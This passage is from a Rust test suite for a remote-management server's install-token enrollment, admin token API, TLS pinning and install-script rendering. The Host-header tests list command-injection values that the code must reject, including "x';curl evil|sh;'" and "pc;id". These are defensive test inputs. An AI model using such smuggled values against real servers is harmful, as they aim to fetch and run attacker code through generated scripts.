            assert_eq!(t.await.unwrap().expect("no database error"), Outcome::Enrolled { counted: true });
        }
        assert_eq!(uses(&db, &token).await, 24);
    }

    /// After "reset key" (admin.rs) a computer that joined with an install
    /// token joins again with one (a use is spent), keeping its host row;
    /// a host that never joined with one still can't be claimed this way.
    #[tokio::test]
    async fn rejoin_after_key_reset() {
        let db = test_db().await;
        let token = add_token(&db, "+1 hours", None, false).await;
        assert_eq!(auth(&db, "pc", KEY, Some(&token)).await, Outcome::Enrolled { counted: true });
        sqlx::query("UPDATE hosts SET agent_key_hash = NULL, enrolled = 0 WHERE id = 'pc'").execute(&db).await.unwrap();
        assert!(matches!(auth(&db, "pc", OTHER_KEY, None).await, Outcome::Rejected(_)));
        assert_eq!(auth(&db, "pc", OTHER_KEY, Some(&token)).await, Outcome::Enrolled { counted: true });
        assert_eq!(uses(&db, &token).await, 2);
        let (enrolled, key_hash): (i64, String) =
            sqlx::query_as("SELECT enrolled, agent_key_hash FROM hosts WHERE id = 'pc'").fetch_one(&db).await.unwrap();
        assert_eq!(enrolled, 1);
        assert_eq!(key_hash, security::sha256_hex(OTHER_KEY));
        assert_eq!(auth(&db, "pc", OTHER_KEY, None).await, Outcome::Accepted);
        assert!(matches!(auth(&db, "pc", KEY, None).await, Outcome::Rejected(_)));
        // A keyless host that joined with the main token: not claimed, no use spent.
        sqlx::query("INSERT INTO hosts (id, name, status) VALUES ('legacy', 'L', 'Offline')").execute(&db).await.unwrap();
        assert!(matches!(auth(&db, "legacy", KEY, Some(&token)).await, Outcome::Rejected(_)));
        assert_eq!(uses(&db, &token).await, 2);
    }

    #[tokio::test]
    async fn admin_api_creates_lists_and_revokes() {
        let db = test_db().await;
        let state = Arc::new(SignalingState::new(db.clone(), "t".into(), None));
        let admin = || AdminUser { user_id: "a1".into(), username: "admin".into() };
        let req = CreateInstallToken { label: "Lab PCs".into(), valid_hours: 24, max_uses: Some(10) };
        let r = create_token(admin(), State(state.clone()), uri(), host_only("srv.lan:8090"), Default::default(), Json(req))
            .await
            .ok()
            .unwrap()
            .into_response();
        assert_eq!(r.status(), StatusCode::CREATED);
        let body: serde_json::Value =
            serde_json::from_slice(&axum::body::to_bytes(r.into_body(), 1 << 16).await.unwrap()).unwrap();
        let token = body["token"].as_str().unwrap().to_string();
        assert!(plausible_token(&token));
        assert_eq!(body["label"], "Lab PCs");
        assert_eq!(body["max_uses"], 10);
        assert_eq!(body["uses"], 0);
        assert_eq!(body["revoked"], false);
        // How the command fetches the script (no HTTPS listener in tests).
        assert!(body["install"]["script_origin"].is_null());
        // "YYYY-MM-DD HH:MM:SS", UTC.
        let created = body["created_at"].as_str().unwrap();
        assert_eq!(created.len(), 19);
        assert!(body["expires_at"].as_str().unwrap() > created);
        // Stored as a hash only.
        let stored: String = sqlx::query_scalar("SELECT token_hash FROM install_tokens").fetch_one(&db).await.unwrap();
        assert_eq!(stored, security::sha256_hex(&token));

        let r = list_tokens(admin(), State(state.clone())).await.ok().unwrap().into_response();
        let list: serde_json::Value =
            serde_json::from_slice(&axum::body::to_bytes(r.into_body(), 1 << 16).await.unwrap()).unwrap();
        assert_eq!(list.as_array().unwrap().len(), 1);
        assert!(list[0].get("token").is_none());

        let id = body["id"].as_str().unwrap().to_string();
        let r = revoke_token(admin(), State(state.clone()), Path(id)).await.ok().unwrap().into_response();
        assert_eq!(r.status(), StatusCode::NO_CONTENT);
        assert!(matches!(auth(&db, "pc", KEY, Some(&token)).await, Outcome::Rejected(_)));
        assert!(revoke_token(admin(), State(state.clone()), Path("nope".into())).await.is_err());

        for (label, hours, max) in [("x".repeat(65), 1, None), ("ok".into(), 0, None), ("ok".into(), 721, None), ("ok".into(), 1, Some(0))] {
            let req = CreateInstallToken { label, valid_hours: hours, max_uses: max };
            let r = create_token(admin(), State(state.clone()), uri(), host_only("srv.lan:8090"), Default::default(), Json(req)).await;
            assert_eq!(r.err().unwrap().0, StatusCode::BAD_REQUEST);
        }
    }

    fn uri() -> axum::http::Uri {
        axum::http::Uri::from_static("/api/admin/install-tokens")
    }

    fn host_only(host: &str) -> HeaderMap {
        headers(&[("host", host)])
    }

    fn headers(pairs: &[(&str, &str)]) -> HeaderMap {
        let mut h = HeaderMap::new();
        for (k, v) in pairs {
            h.append(axum::http::HeaderName::from_bytes(k.as_bytes()).unwrap(), HeaderValue::from_str(v).unwrap());
        }
        h
    }

    #[test]
    fn host_header_checks() {
        for ok in ["pc.lan", "pc.lan:8090", "10.0.0.5:8443", "[::1]:8090", "[fe80::1]", "Example.COM"] {
            assert!(valid_host(ok).is_some(), "{ok}");
        }
        for bad in [
            "", "pc lan", "pc.lan:", "pc.lan:0", "pc.lan:65536", "pc.lan:80x", "evil'$(id)", "a\"b", "user@pc",
            "pc/lan", "[::1", "[zz::1]", "[::1]x", "-pc", "pc;id", "pc`id`", "a:b:c",
        ] {
            assert!(valid_host(bad).is_none(), "{bad}");
        }
    }

    #[test]
    fn script_values_follow_the_request() {
        let lan: Option<std::net::IpAddr> = Some("192.168.1.20".parse().unwrap());
        let lo: Option<std::net::IpAddr> = Some("127.0.0.1".parse().unwrap());
        let fp = "ab".repeat(32);
        let https = Some(8443);
        // Plain HTTP without an HTTPS listener: ws to the same address.
        let v = script_values(&host_only("srv.lan:8090"), None, lan, false, None, None).unwrap();
        assert_eq!(v.server_url, "ws://srv.lan:8090");
        assert_eq!(v.cert_sha256, None);
        assert_eq!(v.version, env!("CARGO_PKG_VERSION"));
        // Plain HTTP with one: the agent goes to it, pinned.
        let v = script_values(&host_only("srv.lan:8090"), None, lan, false, https, Some(&fp)).unwrap();
        assert_eq!(v.server_url, "wss://srv.lan:8443");
        assert_eq!(v.cert_sha256.as_deref(), Some(fp.as_str()));
        let v = script_values(&host_only("[fe80::1]:8090"), None, lan, false, https, Some(&fp)).unwrap();
        assert_eq!(v.server_url, "wss://[fe80::1]:8443");
        let v = script_values(&host_only("10.0.0.5"), None, lan, false, Some(9443), Some(&fp)).unwrap();
        assert_eq!(v.server_url, "wss://10.0.0.5:9443");
        // HTTPS configured but not serving (no certificate loaded): ws as before.
        let v = script_values(&host_only("srv.lan:8090"), None, lan, false, https, None).unwrap();
        assert_eq!(v.server_url, "ws://srv.lan:8090");
        // The server's own HTTPS: wss there, with the pin.
        let v = script_values(&host_only("srv.lan:8443"), None, lan, true, https, Some(&fp)).unwrap();
        assert_eq!(v.server_url, "wss://srv.lan:8443");
        assert_eq!(v.cert_sha256.as_deref(), Some(fp.as_str()));
        // HTTP/2: no Host header, the authority.
        let v = script_values(&HeaderMap::new(), Some("srv.lan:8443"), lan, true, https, Some(&fp)).unwrap();
        assert_eq!(v.server_url, "wss://srv.lan:8443");
        // A reverse proxy on this machine.
        let h = headers(&[("host", "127.0.0.1:8090"), ("x-forwarded-proto", "https"), ("x-forwarded-host", "remote.example.com")]);
        let v = script_values(&h, None, lo, false, https, Some(&fp)).unwrap();
        assert_eq!(v.server_url, "wss://remote.example.com");
        assert_eq!(v.cert_sha256, None);
        let hp = headers(&[("host", "127.0.0.1:8090"), ("x-forwarded-proto", "http"), ("x-forwarded-host", "remote.lan")]);
        assert_eq!(script_values(&hp, None, lo, false, https, Some(&fp)).unwrap().server_url, "ws://remote.lan");
        // Forwarded headers from elsewhere are not trusted.
        let v = script_values(&h, None, lan, false, None, None).unwrap();
        assert_eq!(v.server_url, "ws://127.0.0.1:8090");
        // Bad hosts are refused, also through a proxy.
        assert!(script_values(&host_only("x';curl evil|sh;'"), None, lan, false, https, Some(&fp)).is_err());
        let h = headers(&[("host", "ok:1"), ("x-forwarded-host", "a b")]);
        assert!(script_values(&h, None, lo, false, None, None).is_err());
        let h = headers(&[("host", "ok:1"), ("x-forwarded-proto", "gopher")]);
        assert!(script_values(&h, None, lo, false, None, None).is_err());
        assert!(script_values(&HeaderMap::new(), None, lan, false, None, None).is_err());
        assert!(script_values(&host_only("ok:1"), None, lan, true, https, Some("x'; id")).is_err());
    }

    #[test]
    fn install_command_fetches_over_pinned_https() {
        let lan: Option<std::net::IpAddr> = Some("192.168.1.20".parse().unwrap());
        let lo: Option<std::net::IpAddr> = Some("127.0.0.1".parse().unwrap());
        let pins = TlsPins { cert_sha256: "cd".repeat(32), spki_sha256_b64: "c3BraQ==".into() };
        // The page on plain HTTP: the script comes from the HTTPS port, pinned.
        let v = install_fetch(&host_only("srv.lan:8090"), None, lan, false, Some(8443), Some(&pins));
        assert_eq!(v["script_origin"], "https://srv.lan:8443");
        assert_eq!(v["spki_sha256"], "c3BraQ==");
        assert_eq!(v["cert_sha256"], "cd".repeat(32));
        // On the HTTPS listener: the same address.
        let v = install_fetch(&host_only("srv.lan:8443"), None, lan, true, Some(8443), Some(&pins));
        assert_eq!(v["script_origin"], "https://srv.lan:8443");
        assert_eq!(v["spki_sha256"], "c3BraQ==");
        // A proxy with https: its address, its certificate checked as usual.
        let h = headers(&[("host", "127.0.0.1:8090"), ("x-forwarded-proto", "https"), ("x-forwarded-host", "remote.example.com")]);
        let v = install_fetch(&h, None, lo, false, Some(8443), Some(&pins));
        assert_eq!(v["script_origin"], "https://remote.example.com");
        assert!(v["spki_sha256"].is_null() && v["cert_sha256"].is_null());
        // No HTTPS at all: nothing to fetch it securely from.
        assert!(install_fetch(&host_only("srv.lan:8090"), None, lan, false, None, None)["script_origin"].is_null());
        let hp = headers(&[("host", "127.0.0.1:8090"), ("x-forwarded-proto", "http")]);
        assert!(install_fetch(&hp, None, lo, false, Some(8443), Some(&pins))["script_origin"].is_null());
    }

    #[test]
    fn pins_come_from_the_certificate() {
        let made = rcgen::generate_simple_self_signed(vec!["srv.lan".to_string()]).unwrap();
        let der = made.cert.der().to_vec();
        let pins = tls_pins(&der).unwrap();
        assert_eq!(pins.cert_sha256, crate::tls::cert_sha256(&der));
        // The SubjectPublicKeyInfo is the key rcgen made.
        let spki = spki_of(&der).unwrap();
        use rcgen::PublicKeyData;
        assert_eq!(spki, made.signing_key.subject_public_key_info().as_slice());
        use sha2::Digest;
        assert_eq!(pins.spki_sha256_b64, sums::base64(&sha2::Sha256::digest(spki)));
        assert!(tls_pins(b"not a certificate").is_none());
        assert!(tls_pins(&der[..der.len() / 2]).is_none());
    }

    #[test]
    fn scripts_are_filled_in() {
        let values = ScriptValues {
            server_url: "wss://srv.lan:8443".into(),
            version: "9.8.7".into(),
            cert_sha256: Some("cd".repeat(32)),
        };
        let sums = format!(
            "# lunaris 9.8.7\n{}  lunaris-agent_9.8.7_amd64.deb\n{}  lunaris-agent-installer-windows.exe\n",
            "11".repeat(32),
            "22".repeat(32)
        );
        for template in [SH_TEMPLATE, PS1_TEMPLATE] {
            for sums in [None, Some(sums.as_bytes())] {
                let out = render(template, &values, sums);
                assert!(!out.contains("@@"), "placeholder left");
                assert!(out.contains("'wss://srv.lan:8443'"));
                assert!(out.contains("'9.8.7'"));
                assert!(out.contains(&format!("'{}'", "cd".repeat(32))));
                assert!(out.is_ascii(), "PowerShell 5.1 reads scripts best as ASCII");
                assert!(!out.contains('\r'));
            }
        }
        // The verified hashes are written in; a file not in the list stays empty.
        let sh = render(SH_TEMPLATE, &values, Some(sums.as_bytes()));
        assert!(sh.contains(&format!("RELEASE_KEY='{}'", sums::release_key_spki_b64())));
        assert!(sh.contains(&format!("PINNED_AGENT_DEB='{}'", "11".repeat(32))));
        assert!(sh.contains("PINNED_HELPER_DEB=''"));
        assert!(sh.contains("PINNED_APPIMAGE=''"));
        let ps = render(PS1_TEMPLATE, &values, Some(sums.as_bytes()));
        assert!(ps.contains(&format!("$PinnedInstaller = '{}'", "22".repeat(32))));
        let ps = render(PS1_TEMPLATE, &values, None);
        assert!(ps.contains("$PinnedInstaller = ''"));
        let plain = render(SH_TEMPLATE, &ScriptValues { cert_sha256: None, ..values }, None);
        assert!(plain.contains("CERT_SHA256=''"));
    }

    /// `bash -n` on the generated script (skipped where bash is missing).
    #[test]
    fn generated_sh_parses() {
        let Ok(bash) = which_bash() else { return };
        let values = ScriptValues { server_url: "ws://srv.lan:8090".into(), version: "1.2.3".into(), cert_sha256: None };
        let dir = std::env::temp_dir().join(format!("lunaris-install-{}", security::random_hex(6)));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("agent.sh");
        std::fs::write(&path, render(SH_TEMPLATE, &values, None)).unwrap();
        let out = std::process::Command::new(bash).arg("-n").arg(&path).output().unwrap();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(out.status.success(), "bash -n: {}", String::from_utf8_lossy(&out.stderr));
    }

    fn which_bash() -> Result<std::path::PathBuf, ()> {
        ["/bin/bash", "/usr/bin/bash"].iter().map(std::path::PathBuf::from).find(|p| p.exists()).ok_or(())
    }
}
